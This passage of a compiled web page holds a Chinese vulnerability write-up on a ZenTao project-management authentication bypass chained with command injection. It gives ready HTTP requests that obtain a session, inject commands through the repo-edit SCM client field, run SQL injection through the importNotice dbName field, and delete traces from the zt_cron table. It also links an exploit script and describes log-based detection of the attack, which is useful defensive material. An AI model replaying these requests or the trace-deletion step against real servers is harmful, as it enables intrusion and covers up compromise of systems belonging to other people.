

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+G+'" alt=""> 执行成功 <img src="'+K+`" alt=""></p><h3 id="第四步-删除数据库执行命令痕迹" tabindex="-1"><a class="header-anchor" href="#第四步-删除数据库执行命令痕迹" aria-hidden="true">#</a> 第四步：删除数据库执行命令痕迹</h3><p>为了防止命令重复执行，以及痕迹残留，可以执行delete数据库语句来删除执行痕迹</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=2d58e1e4397f949aac19d662d0ad8f9b; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">54</span></span>

dbName=a&#39;;delete from zt_cron where remark=&#39;test1&#39;;--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>删除成功 <img src="`+Y+'" alt=""></p><h2 id="漏洞综合利用前台rce-权限绕过-后台命令注入-exp" tabindex="-1"><a class="header-anchor" href="#漏洞综合利用前台rce-权限绕过-后台命令注入-exp" aria-hidden="true">#</a> 漏洞综合利用前台RCE：权限绕过+后台命令注入 EXP</h2><p>比较推荐这种方式，因为利用起来比较简单</p><p>首先在前台访问 http://10.211.55.7/zentao/misc-captcha-user 来获取一个有效session <img src="'+J+`" alt=""></p><p>然后替换以下session，并发送以下HTTP即可触发命令注入</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/repo-edit-1231231</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=cfe3137dc366322f419b19b06e65fc3e; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.211.55.7</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">53</span></span>

SCM=Subversion&amp;client=mkdir+C%3A%5C2success%26&amp;path=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+aa+'" alt=""></p><h2 id="攻击痕迹检测" tabindex="-1"><a class="header-anchor" href="#攻击痕迹检测" aria-hidden="true">#</a> 攻击痕迹检测</h2><h3 id="apache日志" tabindex="-1"><a class="header-anchor" href="#apache日志" aria-hidden="true">#</a> Apache日志</h3><p><code>C:\\xampp\\apache\\logs</code> 在apache的error日志中可以看到后台命令注入的报错，以及后台SQL注入产生的报错信息 <img src="'+ea+'" alt=""></p><p>在accesss访问日志中看到<code>/zentao/misc-captcha-user</code> 权限绕过的URL，如果存在说明存在漏洞利用 <img src="'+sa+'" alt=""></p><h3 id="创建仓库日志检测" tabindex="-1"><a class="header-anchor" href="#创建仓库日志检测" aria-hidden="true">#</a> 创建仓库日志检测</h3><p>创建仓库对漏洞利用没有影响。但是github上的部分POC存在这一步操作</p>',133),ha={href:"https://github.com/webraybtl/zentaopms_poc",target:"_blank",rel:"noopener noreferrer"},ua=s('<p>该POC默认创建代码库名为123456 <img src="'+na+'" alt=""></p><p>如果看到空白用户创建了一个代码库，则说明该系统已被入侵</p><h3 id="后台定时任务数据库痕迹" tabindex="-1"><a class="header-anchor" href="#后台定时任务数据库痕迹" aria-hidden="true">#</a> 后台定时任务数据库痕迹</h3><p>如果攻击者使用定时任务的利用方式，可以到数据库中的zt_cron表中看到执行的具体命令 <img src="'+n+'" alt=""></p><h2 id="待完善的其他利用方法" tabindex="-1"><a class="header-anchor" href="#待完善的其他利用方法" aria-hidden="true">#</a> 待完善的其他利用方法</h2><h3 id="利用插件功能" tabindex="-1"><a class="header-anchor" href="#利用插件功能" aria-hidden="true">#</a> 利用插件功能</h3><p>默认是需要一个文件认证的 <img src="'+ta+'" alt=""></p><p>不过可以通过上面的SQL注入写文件实现绕过 <img src="'+pa+'" alt=""></p><p><img src="'+oa+`" alt=""> 这里需要了解插件编写规则，然后实现RCE</p><h2 id="其他说明" tabindex="-1"><a class="header-anchor" href="#其他说明" aria-hidden="true">#</a> 其他说明</h2><ol><li>github的有些poc并不好用，在某些情况下无法rce，而且不适用于windows的rce</li><li>有些POC是要创建仓库的，但是在我的分析里和实验下，不需要创建仓库也能后台命令注入来执行命令</li><li>这个后台命令注入的漏洞是可能是没有回显的，不过权限绕过还是比较稳定的</li><li>禅道有两种路由模式PATH_INFO、GET方式，其中GET方式为常见的m=module&amp;f=method形式传递模块和方法名，而PATH_INFO则是通过路径和分隔符的方式传递模块和方法名，路由方式及分隔符定义在config/config.php中。</li></ol><h3 id="实战" tabindex="-1"><a class="header-anchor" href="#实战" aria-hidden="true">#</a> 实战</h3><p>可能正常姿势没法报错，可以使用以下语句，获取绝对路径</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/zentao/convert-importNotice-db</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.102.51.175:81</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=960de1f52eabe463c273046348d4e1b6; path=/zentao/; HttpOnly</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://10.102.51.175:81</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">29</span></span>

dbName=a&#39;select sleep(10);--a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+ia+`" alt=""></p><h3 id="linux-禅道" tabindex="-1"><a class="header-anchor" href="#linux-禅道" aria-hidden="true">#</a> linux 禅道</h3><p>爆路径的方法，执行<code>id</code>命令：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/repo-edit-1.html</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">11.54.92.44</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.32 (KHTML, like Gecko) Chrome/99.0.4612.71 Safari/517.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://11.54.92.44/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">zentaosid=bj0sbsjlc7mbdgvk1e42tgp94r</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">36</span></span>

SCM=Subversion&amp;client=\`id\`%26&amp;path=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+ca+`" alt=""></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token number">123</span> <span class="token operator">&gt;</span> /www/zentaopms/www/1.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+da+'" alt=""></p><h2 id="exp" tabindex="-1"><a class="header-anchor" href="#exp" aria-hidden="true">#</a> Exp</h2><p>pocsuite3 脚本已实现漏洞检测、命令执行和linux/win不出网写文件利用：</p><p><a href="/asserts/zentao_bypass_rce.py">zentao_bypass_rce.py</a></p><h2 id="参考" tabindex="-1"><a class="header-anchor" href="#参考" aria-hidden="true">#</a> 参考</h2><p>禅道项目管理系统(ZenTaoPMS)高危漏洞分析与利用：https://xz.aliyun.com/t/8692#toc-7</p><p>禅道系统权限绕过与命令执行漏洞分析：https://mp.weixin.qq.com/s/ZHsYaU31WkzAJijy1V0U1w</p><p>禅道漏洞分析：https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=181552488115152&amp;inviter_id=15418254555482&amp;share_from=ShareToWechat&amp;keyword=0akyEeq1T</p><p>PDO场景下的SQL注入探究：https://xz.aliyun.com/t/3950</p>',29);function ma(ka,va){const t=o("ExternalLinkIcon");return i(),c("div",null,[la,e("p",null,[a("以公开poc "),e("a",ha,[a("https://github.com/webraybtl/zentaopms_poc"),d(t)]),a(" 为例 如果使用此poc攻击，会有一个空白用户名的创建一个代码库的日志记录，")]),ua])}const ba=p(ra,[["render",ma],["__file","ZentaochandaoqiantaiquanxianraoguoRCEfenxi(2022_12_19).html.vue"]]);export{ba as default};
